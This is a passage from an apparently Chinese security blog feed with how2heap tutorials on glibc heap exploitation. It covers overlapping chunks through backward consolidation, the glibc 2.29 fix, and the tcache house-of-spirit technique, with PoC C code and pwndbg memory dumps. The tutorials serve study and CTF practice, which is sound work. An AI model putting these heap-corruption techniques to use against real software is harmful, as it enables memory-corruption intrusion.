bck-&gt;fd = p; ｜</span><br><span class="line">     fwd-&gt;bk = p;----------------------------</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE); <span class="comment">//size|PREV_INUSE==0xf20|0x1==0xf21</span></span><br><span class="line">     set_foot(p, size); <span class="comment">//size==0xf20</span></span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>执行完毕后部分内存如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line">.....</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000f21</span> #b1(<span class="built_in">malloc</span>)-------------------</span><br><span class="line">    #set_head|</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000555555758100</span><span class="number">0x00007ffff7dcdca0</span> |</span><br><span class="line"><span class="meta">#fd#bk|</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> |</span><br><span class="line">......|</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000510</span><span class="number">0x0000000000000490</span> #b2(<span class="built_in">malloc</span>)|</span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span>|</span><br><span class="line"><span class="number">0x555555757c90</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span>   b1实际控制的区域 &lt;-----｜</span><br><span class="line">......｜</span><br><span class="line"><span class="number">0x5555557580f0</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span>｜</span><br><span class="line"><span class="number">0x555555758100</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin) ｜</span></span><br><span class="line"><span class="number">0x555555758110</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span>｜</span><br><span class="line">......｜</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000000</span>｜</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(free)｜</span></span><br><span class="line">......｜</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000f20</span><span class="number">0x0000000000000110</span> <span class="meta">#barrier(malloc)--------------</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757760</span></span><br><span class="line"><span class="function">Size: 0xf21</span></span><br><span class="line"><span class="function">fd: 0x555555758100</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dcdca0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x555555758680</span></span><br><span class="line"><span class="function">Size: 0x110</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555758790</span></span><br><span class="line"><span class="function">Size: 0x1f871</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>注意上面代码框中的内容，现在 b1 堆块的大小已经扩展到了 0xf21！！！<br>我们回头看看究竟是哪一步出现了问题：</p><ol><li>在 POC 的一开始我们创建了 4 个堆块，其名称和实际大小分别为 a==0x511，b==0xa11，c==0x511、barrier==0x111。</li><li>接下来假如存在 UAF 等漏洞修改 b 的 user_data 末尾（c 堆块的起始 0x10）为 0xa00，然后 free 掉 b 使其进入 unsortedbin。</li><li>然后使用单字节溢出漏洞将 b 的大小修改为 0xa00，此时 b 的大小减少了 0<br>x10（之前的修改是为了接下来申请绕过调用 unlink 时的检查）</li><li>之后申请实际大小为 0x500 的堆块（b1），这时会对在 unsortedbin 中的 b 堆块调用 unlink 进行解链切割</li><li>然后我们再次申请实际大小为 0x491 的堆块，这个堆块也会在 unsortedbin 中进行切割，分配之后的堆块称作 b2，我们将 b2 当作要收到攻击的堆块–victim</li><li>接下来 free b1 让其进入 unsortedbin 中，紧接着 free c 堆块，由于 c 堆块的 mchunk_prev_size==0xa10 且 c 的标志位 PREV_INUSE==0x0，<strong>并且 c 的 mchunk_prev_size==0xa10，因此会根据触发合并并依据 mchunk_prev_size 确定合并的大小。（漏洞所在）</strong></li><li>合并之后就会导致 a 的大小扩展到 0xf21，发生堆块重叠，现在可以为所欲为了。<blockquote><p><strong>触发合并的条件：堆块的 PREV_INUSE 标志位为 0（这一点可以通过堆溢出伪造）</strong></p></blockquote></li></ol><hr><p>这里再理清两个概念：</p><ul><li>向后合并：指当 free 某个堆块时，如果之前的一个堆块也处于 free 状态，则站在前一个堆块的立场来看堆块发生向后合并。</li><li>向前合并：指当 free 某个堆块时，如果之后的一个堆块也处于 free 状态，则站在后一个堆块的立场来看堆块发生向前合并。</li></ul><hr><p>为所欲为 ing：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0xc00</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xc00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line"><span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞修补–glibc-2-29"><a href="#漏洞修补–glibc-2-29" class="headerlink" title="漏洞修补–glibc-2.29"></a>漏洞修补–glibc-2.29</h2><p>在全新的 glibc 2.29 的版本中，在“向后合并”时加入了检测机制，这导致我们无法滥用向后合并：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放在内存中就是检测在释放 c 堆块向后合并堆块时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line">    #检测<span class="number">2</span>:chunksize(p)==<span class="number">0x510</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000555555758100</span><span class="number">0x00007ffff7dcdca0</span> <span class="meta">#changed</span></span><br><span class="line"><span class="meta">#fd#bk</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000510</span><span class="number">0x0000000000000490</span> <span class="meta">#changed #b2(malloc)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555757c90</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555758100</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(free) 【malloc源码中的p堆块】</span></span><br><span class="line">#检测<span class="number">1</span>【prevsize==<span class="number">0xa10</span>】</span><br><span class="line">                <span class="comment">//0x555555758170-0xa10==0x555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)【malloc源码中的nextchunk】</span></span><br><span class="line">-------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>如上面代码框中的内容所示，很明显对两个堆块的不同位置进行了检查，这样我们就无法使用之前的攻击方式进行攻击。当然这种修补方式仍然可以绕过，这里先按下不表。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(4)-tcache_house_of_spirit（对三个标志位的研究、内存对齐）</title>
    <link href="https://cyberangel.cn/2021/04/27/how2heap(4)-tcache_house_of_spirit%EF%BC%88%E5%AF%B9%E4%B8%89%E4%B8%AA%E6%A0%87%E5%BF%97%E4%BD%8D%E7%9A%84%E7%A0%94%E7%A9%B6%E3%80%81%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90%EF%BC%89/"/>
    <id>https://cyberangel.cn/2021/04/27/how2heap(4)-tcache_house_of_spirit%EF%BC%88%E5%AF%B9%E4%B8%89%E4%B8%AA%E6%A0%87%E5%BF%97%E4%BD%8D%E7%9A%84%E7%A0%94%E7%A9%B6%E3%80%81%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90%EF%BC%89/</id>
    <published>2021-04-27T02:02:35.000Z</published>
    <updated>2021-07-04T09:57:12.210Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这种攻击方式之前我们说过，在这篇文章中我们深入研究一下。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>所有开启 glibc malloc 的版本</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><p>对 POC 进行编译，完成之后对代码第 18 行下断点开始调试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>上述代码调用 malloc 初始化堆区：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619490998657-9d331129-57ac-4e26-a161-62fc02b5965f.png#clientId=u16edb9bc-3c0d-4&from=drop&id=udbdb7a98&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-27%2010.36.34.png&originHeight=257&originWidth=1207&originalType=binary&size=34935&status=done&style=none&taskId=u6ba93195-ea7f-4b1d-b305-49cead3e97e" alt="截屏2021-04-27 10.36.34.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619578365684-567b9690-3bc8-407f-b964-2f4c81bdc88e.png#clientId=u5169fe09-94b7-4&from=drop&id=u94e1cead&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-28%2010.52.41.png&originHeight=202&originWidth=2190&originalType=binary&size=38061&status=done&style=none&taskId=udd5d34c2-d33e-4644-9940-88b39d55f1c" alt="截屏2021-04-28 10.52.41.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;a</span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">            <span class="comment">//a                 //b</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000009</span><span class="number">0x00007ffff7dd5660</span></span><br><span class="line">    <span class="comment">//fake_chunks[0]    fake_chunks[1]</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x00007fffffffddf8</span><span class="number">0x00000000000000f0</span></span><br><span class="line">        <span class="comment">//fake_chunks[2]    fake_chunks[3]</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000001</span><span class="number">0x0000555555554a4d</span></span><br><span class="line">    <span class="comment">//fake_chunks[4]    fake_chunks[5]</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007ffff7de3b40</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">//fake_chunks[6]    fake_chunks[7]</span></span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x0000555555554a00</span><span class="number">0x0000555555554750</span></span><br><span class="line">    <span class="comment">//fake_chunks[8]    fake_chunks[9]</span></span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0x8823772f23466500</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554a00</span><span class="number">0x00007ffff7a03bf7</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们开始伪造堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;a</span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x00007fffffffdd90</span><span class="number">0x0000000000000000</span></span><br><span class="line">            <span class="comment">//a                 //b</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000009</span><span class="number">0x0000000000000040</span></span><br><span class="line">    <span class="comment">//fake_chunks[0]    fake_chunks[1]</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x00007fffffffddf8</span><span class="number">0x00000000000000f0</span></span><br><span class="line">        <span class="comment">//fake_chunks[2]    fake_chunks[3]</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000001</span><span class="number">0x0000555555554a4d</span></span><br><span class="line">    <span class="comment">//fake_chunks[4]    fake_chunks[5]</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007ffff7de3b40</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">//fake_chunks[6]    fake_chunks[7]</span></span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x0000555555554a00</span><span class="number">0x0000555555554750</span></span><br><span class="line">    <span class="comment">//fake_chunks[8]    fake_chunks[9]</span></span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0x1230b9603cc1de00</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554a00</span><span class="number">0x00007ffff7a03bf7</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在我们释放 a 指向的伪造的堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7fffffffdd90</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>当再次 malloc 时就会控制 fake_chunks：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;a</span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x00007fffffffdd90</span><span class="number">0x00007fffffffdd90</span></span><br><span class="line">            <span class="comment">//a                 //b</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000009</span><span class="number">0x0000000000000040</span> <span class="comment">//malloc</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">//fd//bk</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000001</span><span class="number">0x0000555555554a4d</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007ffff7de3b40</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x0000555555554a00</span><span class="number">0x0000555555554750</span></span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0x8823772f23466500</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554a00</span><span class="number">0x00007ffff7a03bf7</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h2 id="glibc-源码分析"><a href="#glibc-源码分析" class="headerlink" title="glibc 源码分析"></a>glibc 源码分析</h2><p>看起来很简单：我们需要在 victim 处伪造一个 fake_chunks，然后篡改指针 ptr 指向它，最后 free 之后 malloc 即可控制，但是我们需要注意一些细节，我们先来看 free 掉 fake_chunks 时：</p><h3 id="free-libc-free"><a href="#free-libc-free" class="headerlink" 